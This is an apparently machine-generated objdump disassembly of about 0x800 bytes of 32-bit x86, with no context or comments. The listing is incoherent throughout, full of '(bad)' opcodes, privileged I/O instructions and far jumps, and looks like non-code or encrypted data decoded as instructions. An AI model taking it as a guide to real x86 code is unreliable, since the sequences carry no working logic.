  4089e3:	mov    ecx,0x3927947d
  4089e8:	dec    esp
  4089e9:	outs   dx,DWORD PTR ds:[esi]
  4089eb:	push   ebp
  4089ec:	outs   dx,DWORD PTR ds:[esi]
  4089ed:	push   ecx
  4089ee:	add    al,0x59
  4089f0:	jl     0x4089b9
  4089f2:	aas    
  4089f3:	xor    dl,BYTE PTR [ecx]
  4089f5:	aam    0x83
  4089f7:	mov    al,ds:0x9a8381eb
  4089fc:	and    ebp,eax
  4089fe:	xor    eax,0x785d7413
  408a03:	(bad)  
  408a04:	fdiv   DWORD PTR [ecx+0x18]
  408a07:	inc    eax
  408a08:	cmp    edi,DWORD PTR [edi+0x54c55244]
  408a0e:	mov    ecx,0xd193bf9c
  408a13:	xchg   esi,eax
  408a14:	(bad)  
  408a15:	adc    bh,BYTE PTR [ebp-0x4c]
  408a18:	inc    esi
  408a19:	cmp    DWORD PTR [eax-0xdfc6a07],edi
  408a1f:	sub    BYTE PTR fs:[eax+0x3e],0x8
  408a24:	sub    BYTE PTR [eax+0x187a8fc5],0x38
  408a2b:	fistp  WORD PTR [edi+ebp*1]
  408a2e:	mov    edi,0x2e3c19ad
  408a33:	fcmove st,st(3)
  408a35:	dec    edi
  408a36:	mov    eax,ds:0x62f68074
  408a3b:	push   ebx
  408a3c:	dec    esp
  408a3d:	xchg   DWORD PTR [edi],esp
  408a3f:	push   esi
  408a40:	jo     0x408a25
  408a42:	mov    bp,0x6b62
  408a46:	rcr    DWORD PTR [edi+0x6a],0x5e
  408a4a:	cmp    al,0x52
  408a4c:	(bad)  
  408a4e:	rol    BYTE PTR [eax],1
  408a50:	mov    ds:0xf9641a49,al
  408a55:	and    cl,al
  408a57:	pop    esi
  408a58:	mov    ebx,0x1b9be4f2
  408a5d:	test   BYTE PTR cs:[ebp-0x5],bl
  408a61:	cmc    
  408a62:	in     eax,0xa2
  408a64:	out    dx,eax
  408a65:	sub    BYTE PTR [ebx-0x3c],cl
  408a68:	mov    dl,0x82
  408a6a:	out    dx,al
  408a6b:	leave  
  408a6c:	ins    DWORD PTR es:[edi],dx
  408a6d:	jmp    0xb5a7:0x805917d5
  408a74:	jl     0x408a08
  408a76:	shr    BYTE PTR [eax-0x667c38b2],cl
  408a7c:	popf   
  408a7d:	ffreep st(7)
  408a7f:	pushf  
  408a80:	scas   al,BYTE PTR es:[edi]
  408a81:	jmp    0xfc4530a3
  408a86:	rcl    BYTE PTR [ebp-0x19],cl
  408a89:	leave  
  408a8a:	js     0x408ab1
  408a8c:	push   ecx
  408a8d:	out    dx,eax
  408a8e:	xchg   DWORD PTR ds:0x980ff4b3,ebp
  408a94:	adc    eax,0x25927279
  408a99:	enter  0x307e,0xb0
  408a9d:	pop    edx
  408a9e:	mov    bl,0x6c
  408aa0:	loope  0x408ae4
  408aa2:	les    esi,FWORD PTR [ebx+ebx*2-0x5f]
  408aa6:	loop   0x408ac2
  408aa8:	lea    ebp,[edx+0x41]
  408aab:	shr    esi,cl
  408aad:	call   DWORD PTR [edx+esi*1+0x159739e0]
  408ab4:	sub    al,0x44
  408ab6:	pop    eax
  408ab7:	mov    cl,0x7d
  408ab9:	pop    esp
  408aba:	mov    bl,0xa2
  408abc:	sub    BYTE PTR [esi-0x3e9f9a2d],cl
  408ac2:	std    
  408ac3:	(bad)
  408ac8:	xchg   ecx,eax
  408ac9:	xchg   DWORD PTR [ecx+eax*8+0x3e],edx
  408acd:	xchg   edx,eax
  408ace:	int    0xaf
  408ad0:	test   al,0x6b
  408ad2:	xor    DWORD PTR [ecx+0x19712217],ebx
  408ad8:	mov    dl,BYTE PTR [ebx-0x35]
  408adb:	xchg   edi,eax
  408adc:	inc    ebx
  408add:	into   
  408ade:	pop    ebp
  408adf:	stos   BYTE PTR es:[edi],al
  408ae0:	sub    eax,0xd80fe9dd
  408ae5:	add    DWORD PTR [eax],esi
  408ae7:	lds    ecx,FWORD PTR [eax+0x6134ee12]
  408aed:	fbld   TBYTE PTR [ebp-0x48a9297c]
  408af3:	push   0xf027aa5
  408af8:	(bad)  
  408af9:	jne    0x408b33
  408afb:	inc    esi
  408afc:	sbb    dh,BYTE PTR [edi+0x4eb14d8e]
  408b02:	repnz inc ebx
  408b04:	dec    esp
  408b05:	push   eax
  408b06:	xor    edi,ebx
  408b08:	ins    DWORD PTR es:[edi],dx
  408b09:	mov    esi,0xac734df4
  408b0e:	mov    edx,0xc7d3fa01
  408b13:	outs   dx,BYTE PTR ds:[esi]
  408b14:	ss (bad) 
  408b16:	mov    dl,0x9e
  408b18:	imul   edi,eax,0x67
  408b1b:	addr16 ss add al,0x6c
  408b1f:	sahf   
  408b20:	in     al,dx
  408b21:	mov    ah,0x9a
  408b23:	in     eax,dx
  408b24:	xchg   esp,eax
  408b25:	and    al,0xf2
  408b27:	pop    ebp
  408b28:	push   ds
  408b29:	add    DWORD PTR [edx+0x2f],ecx
  408b2c:	dec    eax
  408b2d:	sahf   
  408b2e:	aas    
  408b2f:	inc    esi
  408b30:	outs   dx,DWORD PTR ds:[esi]
  408b31:	outs   dx,DWORD PTR ds:[esi]
  408b32:	ins    BYTE PTR es:[edi],dx
  408b33:	mov    BYTE PTR [edi+0x7df09956],ah
  408b39:	jg     0x408b50
  408b3b:	fisub  DWORD PTR [ebp+0x42413a73]
  408b41:	mov    bl,0x78
  408b43:	mov    ebx,0x2c0b4796
  408b48:	cmp    eax,0x2af02230
  408b4d:	int3   
  408b4e:	mov    cl,0x81
  408b50:	fcomp  QWORD PTR [ecx]
  408b52:	pop    DWORD PTR [esi+0x52]
  408b55:	nop
  408b56:	stos   DWORD PTR es:[edi],eax
  408b57:	aaa    
  408b58:	cld    
  408b59:	je     0x408bb3
  408b5b:	sub    al,0x55
  408b5d:	add    BYTE PTR [ebp-0x77],dh
  408b60:	jbe    0x408af6
  408b62:	ror    DWORD PTR [edi-0x56a1daf7],1
  408b68:	or     DWORD PTR ds:0x4f64a18d,esi
  408b6e:	shr    BYTE PTR ds:0x70abdd7c,cl
  408b74:	jle    0x408bca
  408b76:	lock fisttp WORD PTR [edx-0x5382aafc]
  408b7d:	add    ebp,DWORD PTR [esi]
  408b7f:	sbb    esi,esi
  408b81:	jmp    0x2f47:0x985cdaae
  408b88:	jns    0x408bef
  408b8a:	test   DWORD PTR [ecx],0xcf97bdbe
  408b90:	mov    ss,WORD PTR [ebx+0x67]
  408b93:	mov    edx,0x9edb58ee
  408b98:	aad    0xa6
  408b9a:	lahf   
  408b9b:	inc    edx
  408b9c:	push   ecx
  408b9d:	jns    0x408b57
  408b9f:	mov    ebp,0x530e370d
  408ba4:	enter  0x476c,0xc
  408ba8:	adc    DWORD PTR [ebp+edx*2-0x150e0706],ecx
  408baf:	das    
  408bb0:	(bad)  
  408bb1:	adc    eax,0xb4a93631
  408bb6:	pusha  
  408bb7:	xchg   DWORD PTR [edi-0x6f],esp
  408bba:	push   edi
  408bbb:	adc    al,0xa
  408bbd:	loop   0x408be6
  408bbf:	cli    
  408bc0:	fbstp  TBYTE PTR [edx+0x77a5d2da]
  408bc6:	out    dx,eax
  408bc7:	jmp    0x5f99472b
  408bcc:	test   al,0xd9
  408bce:	js     0x408bfe
  408bd0:	outs   dx,BYTE PTR ds:[esi]
  408bd1:	dec    esi
  408bd2:	sub    ah,BYTE PTR [ecx+0x4e]
  408bd5:	mov    ds:0x8439fb0c,eax
  408bda:	dec    ecx
  408bdb:	call   DWORD PTR [esi+edi*2+0x1a]
  408bdf:	dec    esp
  408be0:	adc    DWORD PTR [ebp-0x5f],eax
  408be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408be4:	fwait
  408be5:	int    0x62
  408be7:	outs   dx,DWORD PTR ds:[esi]
  408be8:	in     al,0xd7
  408bea:	pop    esp
  408beb:	ds fucomip st,st(0)
  408bee:	(bad)  
  408bef:	std    
  408bf0:	sbb    BYTE PTR [edx-0x44],0xc0
  408bf4:	jno    0x408c03
  408bf6:	add    eax,0xc731763e
  408bfb:	cmp    eax,0xa63d82c0
  408c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c01:	cmp    al,0xd2
  408c03:	fsub   QWORD PTR [eax]
  408c05:	mov    edx,0x4883188c
  408c0a:	outs   dx,DWORD PTR ds:[esi]
  408c0b:	pushf  
  408c0c:	pop    ecx
  408c0d:	(bad)
  408c10:	push   ds
  408c11:	rol    BYTE PTR [ebx+0x7],0x1a
  408c15:	and    bl,BYTE PTR [edi]
  408c17:	imul   eax,DWORD PTR [edx+0x48],0xffffffc4
  408c1b:	out    dx,eax
  408c1c:	jbe    0x408ba2
  408c1e:	arpl   WORD PTR [eax-0x10761c43],ax
  408c24:	cmc    
  408c25:	or     esp,DWORD PTR [ebp-0x45]
  408c28:	clc    
  408c29:	xor    BYTE PTR [ebx+0x26],0x47
  408c2d:	dec    esp
  408c2e:	cmp    eax,0x72037662
  408c33:	push   ecx
  408c34:	mov    ebx,0xece777e6
  408c39:	push   ss
  408c3a:	lods   al,BYTE PTR ds:[esi]
  408c3b:	ret    0x6ca6
  408c3e:	mov    bh,0xa8
  408c40:	pop    ebp
  408c41:	push   edi
  408c42:	sub    cl,BYTE PTR [ebx+0x558be045]
  408c48:	clc    
  408c49:	mov    edi,DWORD PTR [ebp-0x24]
  408c4c:	xor    edx,ecx
  408c4e:	jmp    0x408fc4
  408c53:	inc    esp
  408c54:	pusha  
  408c55:	sub    BYTE PTR [esi],bh
  408c57:	sub    BYTE PTR [esi+0x72],dl
  408c5a:	(bad)
  408c5f:	mov    esp,0x6ce8ab8f
  408c64:	in     al,0x7c
  408c66:	jl     0x408c3f
  408c68:	jns    0x408ce6
  408c6a:	jl     0x408cc3
  408c6c:	xchg   DWORD PTR [ebx+esi*4],ebx
  408c6f:	aaa    
  408c70:	lss    ebx,FWORD PTR [ebx+edx*1+0x132f48fa]
  408c78:	xor    BYTE PTR [ebp-0x252ff896],dh
  408c7e:	adc    ebx,DWORD PTR [edi+0x21]
  408c81:	das    
  408c82:	mov    ebx,DWORD PTR [edi+0x27b25995]
  408c88:	push   esp
  408c89:	cli    
  408c8a:	mov    al,0x19
  408c8c:	xchg   DWORD PTR [eax],esp
  408c8e:	adc    eax,0x40fded54
  408c93:	ror    esi,cl
  408c95:	pop    ss
  408c96:	or     eax,0x7ff76c57
  408c9b:	(bad)  
  408c9c:	vpaddsw ymm5,ymm5,ymm2
  408ca0:	jbe    0x408ca6
  408ca2:	xor    ah,BYTE PTR [ebp-0x6ceb19a2]
  408ca8:	inc    ebp
  408ca9:	jmp    0x2b68fe1d
  408cae:	cmp    eax,0x1db4f557
  408cb3:	enter  0x2f9c,0xac
  408cb7:	inc    esi
  408cb8:	out    0x22,eax
  408cba:	por    mm0,QWORD PTR ds:[ecx]
  408cbe:	xor    eax,0xc04fb4c0
  408cc3:	icebp  
  408cc4:	jp     0x408cbd
  408cc6:	adc    eax,0x62a7d3b2
  408ccb:	int3   
  408ccc:	out    dx,eax
  408ccd:	invd   
  408ccf:	or     eax,0x27d8c932
  408cd4:	mov    esi,DWORD PTR [esi+0x70]
  408cd7:	jp     0x408d29
  408cd9:	inc    esp
  408cda:	jge    0x408d03
  408cdc:	xchg   ebx,eax
  408cdd:	nop
  408cde:	(bad)  
  408ce0:	or     eax,eax
  408ce2:	cs data16 stos BYTE PTR es:[edi],al
  408ce5:	bnd call 0xb95863f8
  408ceb:	cs pop edx
  408ced:	lahf   
  408cee:	jl     0x408cfe
  408cf0:	jb     0x408d38
  408cf2:	cmc    
  408cf3:	or     dl,ch
  408cf5:	inc    edx
  408cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cf7:	cmp    cl,ah
  408cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cfa:	aas    
  408cfb:	fldenv [ebp-0x5b]
  408cfe:	(bad)  
  408cff:	and    eax,0xd49eaf24
  408d04:	sbb    edi,eax
  408d06:	or     edx,edi
  408d08:	lea    ebp,[edi]
  408d0a:	jbe    0x408d2f
  408d0c:	mov    ebp,DWORD PTR [edx]
  408d0e:	xor    esp,0x5f82ab65
  408d14:	repnz mov eax,ds:0x8729cc7b
  408d1a:	adc    ebx,eax
  408d1c:	icebp  
  408d1d:	dec    esi
  408d1e:	jmp    0x722f477d
  408d23:	test   DWORD PTR [edx],edx
  408d25:	dec    esp
  408d26:	cld    
  408d27:	or     al,0xab
  408d29:	pop    edx
  408d2a:	test   BYTE PTR [ebx-0x8],dl
  408d2d:	inc    ecx
  408d2e:	dec    esi
  408d2f:	add    dl,BYTE PTR [edx+0x1c0715b8]
  408d35:	ficom  WORD PTR [eax-0x1404b7cd]
  408d3b:	data16 fild DWORD PTR ds:0xf5245c08
  408d42:	in     al,0x95
  408d44:	cwde   
  408d45:	iret   
  408d46:	jmp    0x69f4:0xbc18ed99
  408d4d:	arpl   WORD PTR [edi+0x5e],cx
  408d50:	push   ebp
  408d51:	push   eax
  408d52:	(bad)  
  408d53:	scas   eax,DWORD PTR es:[edi]
  408d54:	xchg   esp,eax
  408d55:	inc    edi
  408d56:	retf   
  408d57:	cmp    al,0x18
  408d59:	lods   eax,DWORD PTR ds:[esi]
  408d5a:	dec    esi
  408d5b:	sub    eax,0x2d69cbb6
  408d60:	(bad)  
  408d62:	adc    BYTE PTR [edi],ch
  408d64:	mov    WORD PTR [ecx],ss
  408d66:	ror    DWORD PTR [ebp+0x50859af0],cl
  408d6c:	mov    ecx,0xd77be263
  408d71:	jns    0x408d03
  408d73:	ins    BYTE PTR es:[edi],dx
  408d74:	scas   eax,DWORD PTR es:[edi]
  408d75:	xor    DWORD PTR [esi],0x8edd27fb
  408d7b:	jge    0x408d2e
  408d7d:	pop    ebp
  408d7e:	test   BYTE PTR [ecx],0xf5
  408d81:	ins    DWORD PTR es:[edi],dx
  408d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d83:	adc    BYTE PTR [ebx+0x77c92e2a],0x4c
  408d8a:	and    ch,cl
  408d8c:	mov    ds:0x417e3927,al
  408d91:	clc    
  408d92:	dec    esi
  408d93:	das    
  408d94:	arpl   WORD PTR ds:0xce7f61b3,sp
  408d9a:	jmp    FWORD PTR [esi+edi*1]
  408d9d:	adc    DWORD PTR [esi-0x79208b6c],ecx
  408da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408da4:	aas    
  408da5:	inc    eax
  408da6:	(bad)  
  408da7:	sub    al,0xe8
  408da9:	fisttp DWORD PTR [ebx+edi*1]
  408dac:	test   eax,0x54f1b1de
  408db1:	in     eax,0x53
  408db3:	cs push 0x6a26177c
  408db9:	add    esi,0x3d
  408dbc:	pop    ebx
  408dbd:	xor    al,0xc2
  408dbf:	jmp    0x2b54d139
  408dc4:	inc    esp
  408dc5:	cli    
  408dc6:	stos   BYTE PTR es:[edi],al
  408dc7:	cmp    eax,0xf6890b68
  408dcc:	jbe    0x408dc8
  408dce:	sub    dl,al
  408dd0:	mul    esi
  408dd2:	push   edi
  408dd3:	add    edx,eax
  408dd5:	jae    0x408e37
  408dd7:	out    0xb0,eax
  408dd9:	push   esi
  408dda:	mov    esp,0x66432371
  408ddf:	je     0x408db4
  408de1:	push   0x94348fd
  408de6:	pop    ebp
  408de7:	mov    DWORD PTR [ecx+0x28743bc],ebx
  408ded:	dec    edx
  408dee:	dec    edi
  408def:	lea    ebp,[edi+0x53]
  408df2:	(bad)  
  408df3:	dec    ebp
  408df4:	sub    BYTE PTR [esi+0x17],dl
  408df7:	mov    ecx,0xfa8f9db8
  408dfc:	mov    ds:0xd4046db1,eax
  408e01:	fs pop ds
  408e03:	sub    ecx,DWORD PTR [ecx-0x14]
  408e06:	stc    
  408e07:	inc    edi
  408e08:	push   esi
  408e09:	in     al,dx
  408e0a:	call   0xdfe884ff
  408e0f:	sar    BYTE PTR [eax-0x69],cl
  408e12:	unpcklps xmm6,XMMWORD PTR [edi+0x2d1b07da]
  408e19:	dec    edi
  408e1a:	sbb    ebp,DWORD PTR [ebp+0x51]
  408e1d:	inc    edx
  408e1e:	mov    ds:0x42810df6,eax
  408e23:	sti    
  408e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e25:	sbb    esp,ebp
  408e27:	jge    0x408e5a
  408e29:	shr    ebx,1
  408e2b:	fwait
  408e2c:	mov    ds:0x3db3e9b1,al
  408e31:	push   ebx
  408e32:	adc    eax,0x56d1a951
  408e37:	or     BYTE PTR ds:0x8d73ec8c,cl
  408e3d:	(bad)  
  408e3e:	mov    edx,0xcfe7a565
  408e43:	pop    edx
  408e44:	loopne 0x408e1c
  408e46:	xor    ch,BYTE PTR [edi-0x5b]
  408e49:	jle    0x408eb0
  408e4b:	ja     0x408ded
  408e4d:	sub    edx,DWORD PTR [esp+esi*8+0x18420547]
  408e54:	data16 fild QWORD PTR [edx+0x837f92c]
  408e5b:	jge    0x408ebd
  408e5d:	push   esp
  408e5e:	lds    edx,FWORD PTR [ebp+0x4f08f4ad]
  408e64:	mov    ebx,0xc010d3f5
  408e69:	mov    eax,ecx
  408e6b:	(bad)  
  408e6c:	std    
  408e6d:	lods   eax,DWORD PTR ds:[esi]
  408e6e:	(bad)  
  408e6f:	push   si
  408e71:	shl    edi,1
  408e73:	mov    ebx,0xc212d1f5
  408e78:	loopne 0x408e58
  408e7a:	out    0x85,al
  408e7c:	jp     0x408eba
  408e7e:	fmul   QWORD PTR [edi+edi*1]
  408e81:	push   0xffffff9b
  408e83:	bound  edx,QWORD PTR [ecx]
  408e85:	pop    ss
  408e86:	jecxz  0x408e3f
  408e88:	xor    eax,0xef4df683
  408e8d:	test   esi,eax
  408e8f:	push   esp
  408e90:	ds (bad) 
  408e93:	sbb    BYTE PTR [ebx-0x328251bc],ah
  408e99:	dec    ebp
  408e9a:	imul   edx,DWORD PTR [ecx],0xffffffc2
  408e9d:	(bad)
  408ea0:	dec    ecx
  408ea1:	sub    ch,ah
  408ea3:	sbb    ebp,0xb98b2d42
  408ea9:	sahf   
  408eaa:	sbb    BYTE PTR [ebp-0x79],bl
  408ead:	mov    bl,0x7d
  408eaf:	xchg   esp,eax
  408eb0:	cli    
  408eb1:	jne    0x408ee2
  408eb3:	test   eax,0x2f074833
  408eb8:	adc    eax,0xe01b6712
  408ebd:	cmc    
  408ebe:	adc    DWORD PTR [edx],ebp
  408ec0:	add    ebx,DWORD PTR es:[eax-0x3c]
  408ec4:	and    ecx,DWORD PTR [ecx]
  408ec6:	dec    ebx
  408ec7:	lahf   
  408ec8:	sti    
  408ec9:	aas    
  408eca:	stc    
  408ecb:	out    dx,al
  408ecc:	stos   DWORD PTR es:[edi],eax
  408ecd:	test   DWORD PTR [edi],esp
  408ecf:	cli    
  408ed0:	add    edx,ebx
  408ed2:	call   0xf3ad0a51
  408ed7:	lods   eax,DWORD PTR ds:[esi]
  408ed8:	sbb    edi,DWORD PTR [eax-0x24]
  408edb:	aad    0xdb
  408edd:	arpl   WORD PTR [edx],di
  408edf:	jmp    0xb83e:0x2c3eeff6
  408ee6:	sbb    BYTE PTR [ecx-0x5aac78ae],ah
  408eec:	jl     0x408f62
  408eee:	leave  
  408eef:	ja     0x408f53
  408ef1:	adc    ebp,edi
  408ef3:	cwde   
  408ef4:	or     ebx,DWORD PTR [eax]
  408ef6:	sub    eax,0x2a625238
  408efb:	(bad)  
  408efc:	push   ebp
  408efd:	loop   0x408eca
  408eff:	add    BYTE PTR [ebx-0x2ee21c82],cl
  408f05:	sub    al,0xf1
  408f07:	sub    al,0xa4
  408f09:	inc    ebp
  408f0a:	inc    edi
  408f0b:	xchg   ebx,eax
  408f0c:	cmp    DWORD PTR [ebp-0xdc4ef32],eax
  408f12:	pop    ebx
  408f13:	mov    edx,0xf76a4ed9
  408f18:	sbb    eax,0x764d1a51
  408f1d:	cld    
  408f1e:	mov    edx,0x85e4b088
  408f23:	outs   dx,DWORD PTR ds:[esi]
  408f24:	push   esp
  408f25:	mov    esi,esi
  408f27:	mov    dh,0xe6
  408f29:	sbb    al,0xc4
  408f2b:	out    0xf5,eax
  408f2d:	dec    ebp
  408f2e:	outs   dx,DWORD PTR ds:[esi]
  408f2f:	push   0xffffff80
  408f31:	fsub   QWORD PTR [ebp+ebp*4+0x61]
  408f35:	shr    DWORD PTR [edi+0x34],cl
  408f38:	inc    eax
  408f39:	dec    ebp
  408f3a:	retf   
  408f3b:	(bad)
  408f3f:	jle    0x408f45
  408f41:	or     bh,BYTE PTR [esi-0x686cad1d]
  408f47:	rol    DWORD PTR [edx-0x7f15b678],0xff
  408f4e:	mov    al,ds:0x181ba2ed
  408f53:	or     eax,0x45114b2
  408f58:	add    DWORD PTR [eax],edx
  408f5a:	mov    eax,ds:0xafec95f9
  408f5f:	mov    ecx,0x6180e3be
  408f64:	pop    edi
  408f65:	inc    ecx
  408f66:	sbb    dl,BYTE PTR [ecx+0x3c2ac503]
  408f6c:	and    DWORD PTR [edx+0x44],edx
  408f6f:	popf   
  408f70:	inc    ebx
  408f71:	cmp    al,BYTE PTR [edx]
  408f73:	or     ebx,DWORD PTR [edi-0x34805a5]
  408f79:	fwait
  408f7a:	dec    edx
  408f7b:	inc    esi
  408f7c:	pop    ebp
  408f7d:	mov    ecx,0x82a29ce6
  408f82:	fcmovnbe st,st(1)
  408f84:	jecxz  0x408ff1
  408f86:	sub    edx,ecx
  408f88:	outs   dx,BYTE PTR ds:[esi]
  408f89:	jnp    0x408fcd
  408f8b:	mov    ecx,0x3f630cc4
  408f90:	(bad)  
  408f91:	mov    bh,0x75
  408f93:	cwde   
  408f94:	dec    ebx
  408f95:	jns    0x408f65
  408f97:	push   es
  408f98:	fwait
  408f99:	add    esp,DWORD PTR [eax+edx*8+0x47]
  408f9d:	loopne 0x408f94
  408f9f:	mov    ss,WORD PTR [ebx-0x68]
  408fa2:	(bad)  
  408fa3:	mov    ebp,0xabc4e132
  408fa8:	push   esp
  408fa9:	ds push ss
  408fab:	dec    ecx
  408fac:	dec    edi
  408fad:	and    BYTE PTR [ebx],dh
  408faf:	inc    esi
  408fb0:	pop    ebp
  408fb1:	and    esi,DWORD PTR [ebx-0x57]
  408fb4:	xor    al,0x9e
  408fb6:	cld    
  408fb7:	repz mov esi,0x4395633c
  408fbd:	test   eax,0x1a388d18
  408fc2:	cs sub eax,0xaf0fd603
  408fc8:	xlat   BYTE PTR ds:[ebx]
  408fc9:	sub    DWORD PTR [eax],edx
  408fcb:	jmp    0x409341
  408fd0:	or     eax,0x738240b6
  408fd5:	jb     0x408fa4
  408fd7:	mov    cl,0xfd
  408fd9:	push   eax
  408fda:	sbb    DWORD PTR [edx+eiz*8+0x12],ebp
  408fde:	mov    al,ds:0x7ce0c75a
  408fe3:	jl     0x408fbc
  408fe5:	jns    0x409063
  408fe7:	jl     0x409056
  408fe9:	or     cl,BYTE PTR [ebp-0x5fcec2fe]
  408fef:	sbb    cl,dl
  408ff1:	icebp  
  408ff2:	aaa    
  408ff3:	fistp  DWORD PTR [edx]
  408ff5:	jg     0x40906e
  408ff7:	sub    esp,esp
  408ff9:	mov    ah,0xf2
  408ffb:	mov    bh,0xbf
  408ffd:	adc    eax,0x1522856a
  409002:	aas    
  409003:	sub    eax,DWORD PTR [edx+0x3f]
  409006:	mov    ecx,0x51b8087a
  40900b:	mov    al,0x7b
  40900d:	xor    al,0xb4
  40900f:	fidivr DWORD PTR [eax-0x68ef0843]
  409015:	jmp    0x6395:0x5b076bb9
  40901c:	imul   esp
  40901e:	inc    eax
  40901f:	mov    ds:0x31e97df,al
  409024:	inc    ecx
  409025:	pop    eax
  409026:	dec    ecx
  409027:	add    esi,ebx
  409029:	mov    DWORD PTR ds:0x79b63ee7,0xd613798d
  409033:	mov    eax,0x67c5121f
  409038:	mov    ebx,0x3df57617
  40903d:	dec    edx
  40903e:	arpl   WORD PTR [edx],bp
  409040:	leave  
  409041:	adc    al,0xee
  409043:	jne    0x40900d
  409045:	cmp    al,0xca
  409047:	paddw  mm1,QWORD PTR ds:0x846247dc
  40904e:	sbb    al,0xb8
  409050:	pop    esi
  409051:	and    DWORD PTR [eax],ecx
  409053:	jg     0x409035
  409055:	add    edi,DWORD PTR [eax]
  409057:	pushf  
  409058:	nop
  409059:	adc    al,0xf
  40905b:	stos   DWORD PTR es:[edi],eax
  40905c:	les    eax,FWORD PTR [eax-0x49]
  40905f:	and    eax,0x1958cff
  409064:	add    eax,0x4b8c19a1
  409069:	jmp    0xee5e:0x74de3aa2
  409070:	(bad)  
  409071:	daa    
  409072:	addr16 dec edi
  409074:	mov    eax,ds:0x8c498951
  409079:	inc    ebp
  40907a:	sub    DWORD PTR ds:0x6b641f12,edi
  409080:	xchg   esi,eax
  409081:	shl    ebp,0x7d
  409084:	rcl    DWORD PTR [bx+0x2c0d],1
  409089:	add    eax,0xd42eecd0
  40908e:	or     edx,DWORD PTR [esi+0x40a2ced1]
  409094:	sub    eax,0x6b990c35
  409099:	cld    
  40909a:	mov    edi,0xd0a94b72
  40909f:	xor    ebx,DWORD PTR [edx+0x7e95fb21]
  4090a5:	hlt    
  4090a6:	mov    ebx,0x1befe9cb
  4090ab:	loope  0x4090ab
  4090ad:	lods   al,BYTE PTR ds:[esi]
  4090ae:	cwde   
  4090af:	cld    
  4090b0:	xor    al,0xeb
  4090b2:	addr16 ror edx,0x50
  4090b6:	shr    BYTE PTR [esi-0xe],0x8
  4090ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090bb:	xchg   edx,eax
  4090bc:	pusha  
  4090bd:	add    eax,0x1114d889
  4090c2:	mov    ebx,0x7babcb1f
  4090c7:	js     0x4090f0
  4090c9:	popa   
  4090ca:	call   0x351:0x27b4ace5
  4090d1:	loop   0x4090bc
  4090d3:	imul   ebx,esp,0xffffffd5
  4090d6:	div    DWORD PTR [edx]
  4090d8:	sbb    eax,0x915a1e2c
  4090dd:	cmp    eax,DWORD PTR [esi+0x73fc9038]
  4090e3:	shl    DWORD PTR [ebp-0x552a688e],1
  4090e9:	sbb    BYTE PTR [ebx+ebp*8+0x5469fb8a],cl
  4090f0:	mov    cl,0x55
  4090f2:	inc    DWORD PTR [ecx+ebp*1-0x788f1bb0]
  4090f9:	push   0x4bda560c
  4090fe:	or     al,0x26
  409100:	sub    DWORD PTR [ecx],0xffffffef
  409103:	jo     0x409169
  409105:	and    ebp,DWORD PTR ss:[bx]
  409109:	or     DWORD PTR [edi-0x4f44748d],ebx
  40910f:	stc    
  409110:	repnz adc eax,0xdeb48d3d
  409116:	xor    esp,DWORD PTR [ebx]
  409118:	jle    0x40909c
  40911a:	sti    
  40911b:	mov    ds:0x7881c5cc,eax
  409120:	push   ecx
  409121:	sahf   
  409122:	out    dx,al
  409123:	cmp    al,0xad
  409125:	test   BYTE PTR [esi+edi*2+0x6b],ch
  409129:	mov    ds:0xec7cecf1,eax
  40912e:	mov    esi,0x659b7c8
  409133:	cli    
  409134:	out    dx,al
  409135:	mov    esp,0xbd3008d5
  40913a:	loop   0x409183
  40913c:	sub    eax,0x9b905c37
  409141:	lock shl BYTE PTR [ecx+0x5c6451bb],1
  409148:	aas    
  409149:	mov    ss,esi
  40914b:	jne    0x4090db
  40914d:	adc    bh,bl
  40914f:	pop    eax
  409150:	(bad)  
  409151:	sub    eax,0x9d952b49
  409156:	xchg   ebx,eax
  409157:	or     edx,0x78f2a497
  40915d:	lods   al,BYTE PTR ds:[esi]
  40915e:	popa   
  40915f:	adc    al,0xd8
  409161:	clc    
  409162:	xchg   edi,eax
  409163:	jne    0x409119
  409165:	lods   al,BYTE PTR ds:[esi]
  409166:	dec    ebx
  409167:	out    0x4c,eax
  409169:	push   esi
  40916a:	test   DWORD PTR [ecx-0x53c9535b],esi
  409170:	adc    eax,0xdff3335e
  409175:	mov    fs,WORD PTR [ebp+0x2d99a7cd]
  40917b:	lahf   
  40917c:	inc    esp
  40917d:	clc    
  40917e:	(bad)  
  40917f:	(bad)  
  409180:	cmc    
  409181:	jno    0x4091de
  409183:	and    edx,DWORD PTR [edi-0x63]
  409186:	xchg   esi,eax
  409187:	inc    esi
  409188:	dec    esi
  409189:	pop    ss
  40918a:	dec    edi
  40918b:	aam    0xdb
  40918d:	mov    BYTE PTR [esi],cl
  40918f:	or     eax,0x61f8de2a
  409194:	stc    
  409195:	idiv   dh
  409197:	dec    esp
  409198:	pop    ebx
  409199:	pop    edx
  40919a:	cld    
  40919b:	dec    ebp
  40919c:	repnz add bl,0x3
  4091a0:	sub    al,0x17
  4091a2:	xchg   esi,eax
  4091a3:	sahf   
  4091a4:	(bad)
  4091a7:	jmp    0xf6657f31
  4091ac:	fs mov edx,0x9e1ddedc
  4091b2:	icebp  
  4091b3:	push   ecx
  4091b4:	lods   eax,DWORD PTR ds:[esi]
  4091b5:	push   ds
  4091b6:	dec    edx
  4091b7:	jb     0x4091f2
  4091b9:	xor    ebx,edi
  4091bb:	les    ecx,FWORD PTR [ecx-0x88c2468]
  4091c1:	out    0xac,eax
  4091c3:	mov    ?,WORD PTR [eax]
  4091c5:	xchg   ebp,eax
  4091c6:	sub    ebx,DWORD PTR [eax+0x4d890234]
  4091cc:	scas   al,BYTE PTR es:[edi]
  4091cd:	shl    DWORD PTR [edx+0x7a],cl
  4091d0:	mov    cl,0xf3
  4091d2:	dec    ebp
  4091d3:	aas    
  4091d4:	in     al,dx
  4091d5:	mov    ch,BYTE PTR [eax]
  4091d7:	sti    
  4091d8:	adc    BYTE PTR [ebx-0x41],bh
  4091db:	shl    BYTE PTR [edi+0x48],0xec
  4091df:	fwait
  4091e0:	add    al,0xab
  4091e2:	rcr    BYTE PTR [ecx+esi*1-0x3c08d8e9],0xd
  4091ea:	xchg   ebp,eax
  4091eb:	outs   dx,DWORD PTR ds:[esi]
